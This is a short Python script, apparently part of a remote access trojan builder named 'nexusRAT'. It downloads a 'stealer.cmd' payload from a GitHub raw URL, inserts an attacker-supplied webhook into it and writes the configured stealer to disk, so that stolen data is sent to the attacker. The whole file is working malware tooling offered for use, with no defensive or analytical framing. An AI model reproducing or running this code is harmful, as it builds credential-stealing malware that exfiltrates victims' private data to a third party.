import requests
import os
from setting import *

stealerurl = "https://raw.githubusercontent.com/hai723/nexusRAT/main/scr/stealer.cmd"
stealer = requests.get(stealerurl).text
stealer = stealer.replace("stealerwebhook", hook)

with open(stealerpath, "w", encoding="utf-8") as file:
    file.write(stealer)
